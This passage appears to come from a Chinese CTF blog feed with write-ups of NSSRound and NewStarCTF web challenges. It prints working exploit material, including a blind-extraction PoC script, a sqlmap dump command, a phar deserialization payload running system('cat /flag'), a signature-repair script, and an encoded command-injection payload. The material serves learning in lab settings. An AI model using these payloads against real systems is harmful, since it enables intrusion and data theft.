class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span> <span class="token operator">=</span> SECRET_KEY    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''@app.route('/getkey', methods=["GET"])def getkey():    if request.method != "GET":        session["key"]=SECRET_KEY'''</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_hindd_result'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_hindd_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file:'</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"no no no"</span>        data <span class="token operator">=</span> <span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        url_text <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> url_text <span class="token keyword">in</span> data <span class="token keyword">or</span> data <span class="token keyword">in</span> url_text<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"you get it"</span>    <span class="token keyword">return</span> <span class="token string">"what ???"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getflag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> flag<span class="token punctuation">.</span>waf<span class="token punctuation">(</span>request<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>poc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://1.14.71.254:28472/get_data"</span>letters <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz}-{"</span>flag <span class="token operator">=</span> <span class="token string">'NSSCTF{'</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> letters<span class="token punctuation">:</span>        temp_flag <span class="token operator">=</span> flag <span class="token operator">+</span> i        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"temp_flag:"</span><span class="token punctuation">,</span> temp_flag<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string">'FILE:///proc/self/environ'</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> temp_flag<span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'%E6%8F%90%E4%BA%A4'</span><span class="token punctuation">,</span> <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token comment"># print(str(res.cookies.values())[2:-2])</span>        result <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://1.14.71.254:28472/get_hindd_result"</span><span class="token punctuation">,</span>                              cookies<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"session"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token comment"># print(result.text)</span>        <span class="token keyword">if</span> <span class="token string">"you get it"</span> <span class="token keyword">in</span> result<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token comment"># NSSCTF{04106186-e3b2-4766-ba0b-0064e4bfd705}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSRound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 1 Basic</title>
      <link href="/2023/01/21/catchtheflag/games/nssctf/nssround-1-basic/"/>
      <url>/2023/01/21/catchtheflag/games/nssctf/nssround-1-basic/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-1-Basic"><a href="#NSSRound-1-Basic" class="headerlink" title="NSSRound 1 Basic"></a>NSSRound 1 Basic</h1><h2 id="1-sql-by-sql"><a href="#1-sql-by-sql" class="headerlink" title="1. sql_by_sql"></a>1. sql_by_sql</h2><p>#SQL注入 #SQLite #布尔盲注 #二次注入 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>开启环境后是一个简简单单的注册 / 登录界面，注册 admin 用户时出现报错，也就是说可能存在 admin 用户，目标也就是获得 admin 用户权限</p><p>注册个测试用户，登录之后存在密码修改的功能，可能在此处存在 SQL 注入</p><p>推测下修改语句为</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> <span class="token keyword">user</span> <span class="token keyword">SET</span> passwd <span class="token operator">=</span> <span class="token string">'xxx'</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'xxx'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注册个 <code>admin' -- qwe</code> 用户，然后修改密码即可修改 admin 用户密码从而获取 admin 用户权限</p><p><img src="/../../../../pic/Pasted%20image%2020230216143007.png"></p><p>登录进 admin 用户存在查询用户的功能</p><p>在使用 mysql 中的注释符 <code>#</code> 时出现报错，也就是说使用的可能不是 mysql 数据库</p><p><img src="/../../../../pic/Pasted%20image%2020230216143133.png"></p><p>探测下是否为其他数据库，尝试查询  <code>sqlite_master</code> 数据库</p><pre class="line-numbers language-none"><code class="language-none">id=1 and substr((select group_concat(sql) from sqlite_master),1,1)='a'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230216143344.png"></p><p>查到结果，所以这里使用的是 sqlite 数据库</p><p>SQLite中有一个类似 information_schema 功能的表 sqlite_master</p><p>其中有五个字段</p><ul><li><p>type：记录项目的类型，如table、index、view、trigger</p></li><li><p>name：记录项目的名称，如表名、索引名等</p></li><li><p>tbl_name：记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身</p></li><li><p>rootpage：记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL</p></li><li><p>sql：记录创建该项目的SQL语句</p></li></ul><p>由于没有什么过滤这里也就用 sqlmap 一把梭了</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r req.txt  -p id --technique B --random-agent -T flag -C flag --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSRound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 4 SWPU</title>
      <link href="/2023/01/21/catchtheflag/games/nssctf/nssround-4-swpu/"/>
      <url>/2023/01/21/catchtheflag/games/nssctf/nssround-4-swpu/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-4-SWPU"><a href="#NSSRound-4-SWPU" class="headerlink" title="NSSRound 4 SWPU"></a>NSSRound 4 SWPU</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-1zweb-revenge"><a href="#1-1zweb-revenge" class="headerlink" title="1. 1zweb(revenge)"></a>1. 1zweb(revenge)</h3><p>#phar反序列化 #phar签名修复 #PHP伪协议 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>进去环境给了两个功能点，一个可以用来读取文件，另一个则可以用来上传文件，这两个配合起来，考察 phar 反序列化的可能性更高一点</p><p>在文件读取出可以使用 PHP 伪协议读取出来源代码，审计之后发现确实需要利用 phar 反序列化</p><p><img src="/../../../../pic/Pasted%20image%2020230227234925.png"></p><p>在 <code>upload.php</code> 中存在对上传文件的内容检测，这检测的内容是 phar 文件必须的文件头，也就是说我们需要对此进行绕过</p><p>而  <code>phar://</code> 协议与 <code>zip://</code> 类似，同样可以访问zip格式压缩包内容，可以先将生成的 phar 文件使用 gzip 进行压缩然后上传再使用 phar 读取即可绕过对文件头的检测</p><p><img src="/../../../../pic/Pasted%20image%2020230228003135.png"></p><p>在目标类中存在 <code>__wakeup() </code>方法，可以通过属性个数进行绕过，这样做会修改 phar 的文件内容导致签名错误，所以还需要重新生成签名</p><p>重新生成签名的脚本</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main    <span class="token keyword">import</span> <span class="token punctuation">(</span>     <span class="token string">"crypto/sha1"</span>     <span class="token string">"io"</span>     <span class="token string">"os"</span>     <span class="token string">"syscall"</span>  <span class="token punctuation">)</span>    <span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     srcfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_RDONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> srcfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       dstfile<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"dst.phar"</span><span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>O_CREAT<span class="token operator">|</span>syscall<span class="token punctuation">.</span>O_WRONLY<span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     <span class="token keyword">defer</span> dstfile<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>       data<span class="token punctuation">,</span> err <span class="token operator">:=</span> io<span class="token punctuation">.</span><span class="token function">ReadAll</span><span class="token punctuation">(</span>srcfile<span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>     payload <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span>     tail <span class="token operator">:=</span> data<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>     hash <span class="token operator">:=</span> sha1<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     hash<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>     sum <span class="token operator">:=</span> hash<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>       <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">=</span> dstfile<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token function">append</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> sum<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">,</span> tail<span class="token operator">...</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成一个 phar 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">LoveNss</span><span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token variable">$ljt</span><span class="token operator">=</span><span class="token string double-quoted-string">"Misc"</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token variable">$dky</span><span class="token operator">=</span><span class="token string double-quoted-string">"Re"</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"system('cat /flag');"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LoveNss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" __HALT_COMPILER();"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改其中的内容绕过 <code>__wakeup()</code> 方法，然后重新计算下签名后使用 gzip 进行压缩上传，使用 phar 进行读取</p><p><img src="/../../../../pic/Pasted%20image%2020230228003443.png"></p><pre class="line-numbers language-none"><code class="language-none">[POST]file=phar://./upload/dst.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230228003506.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSRound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound V Team</title>
      <link href="/2023/01/21/catchtheflag/games/nssctf/nssround-v-team/"/>
      <url>/2023/01/21/catchtheflag/games/nssctf/nssround-v-team/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team"><a href="#NSSRound-V-Team" class="headerlink" title="NSSRound V Team"></a>NSSRound V Team</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-PYRCE"><a href="#1-PYRCE" class="headerlink" title="1. PYRCE"></a>1. PYRCE</h3><p>#命令执行 </p><ul><li>环境描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>访问 <code>/source</code> 获得源代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> make_response  <span class="token keyword">import</span> uuid  <span class="token keyword">import</span> os    <span class="token comment"># flag in /flag  </span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>rce<span class="token punctuation">)</span><span class="token punctuation">:</span>      black_list <span class="token operator">=</span> <span class="token string">'01233456789un/|{}*!;@#\n`~\'\"&gt;&lt;=+-_ '</span>      <span class="token keyword">for</span> black <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>          <span class="token keyword">if</span> black <span class="token keyword">in</span> rce<span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token boolean">False</span>      <span class="token keyword">return</span> <span class="token boolean">True</span>  <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Ňśś"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          nss <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Ňśś"</span><span class="token punctuation">)</span>          <span class="token keyword">if</span> waf<span class="token punctuation">(</span>nss<span class="token punctuation">)</span><span class="token punctuation">:</span>              os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>nss<span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">return</span> <span class="token string">"waf"</span>      <span class="token keyword">return</span> <span class="token string">"/source"</span>      <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      src <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> src    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>      app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以进行命令执行但是过滤掉了一些东西</p><ul><li>空格用tab绕过</li><li>/ 通过pwd得到，不过需要反复用cd …回到根目录，这样pwd的内容就是 /</li><li>目标不出网，一种是反弹shell，一种是覆盖目标文件，采取覆盖目标文件的方法，然后访问 /resource路由，读取app.py的内容即flag的内容</li></ul><p>构造 payload</p><pre class="line-numbers language-none"><code class="language-none">cp%09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问 <code>/source</code> 读取 app.py 获得 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NSSRound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF Week 1</title>
      <link href="/2023/01/21/catchtheflag/games/newstarctf/newstarctf-week-1/"/>
      <url>/2023/01/21/catchtheflag/games/newstarctf/newstarctf-week-1/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-Week-1"><a href="#NewStarCTF-Week-1" class="headerlink" title="NewStarCTF Week 1"></a>NewStarCTF Week 1</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-HTTP"><a href="#1-HTTP" class="headerlink" title="1. HTTP"></a>1. HTTP</h3><p>题目内容</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Please `GET` me your `name`,I will tell you more things.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 GET 方式传入 name 参数</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Hello,1. Please `POST` me the `key` Again.But Where is the key?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 POST 方式传入一个参数，查看源码得知需要传入的 key 为 ctfisgood</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">You are smart but you are not `admin`.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>常常通过 cookie 来验证用户</p><p><img src="/../../../../pic/Pasted%20image%2020221017145458.png"></p><h3 id="2-Head-Header"><a href="#2-Head-Header" class="headerlink" title="2. Head?Header!"></a>2. Head?Header!</h3><p>题目</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Must Use `CTF` Brower!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改 UA 为 CTF</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Must From `ctf.com`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加 Referer</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Only Local User Can Get Flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加 XFF</p><p><img src="/../../../../pic/Pasted%20image%2020221017150426.png"></p><h3 id="3-我真的会谢"><a href="#3-我真的会谢" class="headerlink" title="3. 我真的会谢"></a>3. 我真的会谢</h3><p>题目内容</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Flag has three part, qsdz hid them in different files.By the way, these files are sensitive.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有三部分flag</p><p>访问 robots.txt 获取到第一部分 flag</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">flag{Th1s_Is_s00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问 .index.php.swp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> <span class="token parameter variable">-r</span> index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得第二部分flag</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">0_e4sy_d0_y00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问 <a href="http://www.zip/">www.zip</a></p><p>获得第三部分 flag</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">u_th1nk_so?}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-NotPHP"><a href="#4-NotPHP" class="headerlink" title="4. NotPHP"></a>4. NotPHP</h3><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Welcome to CTF"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2077</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hack Me"</span><span class="token punctuation">;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token operator">.</span><span 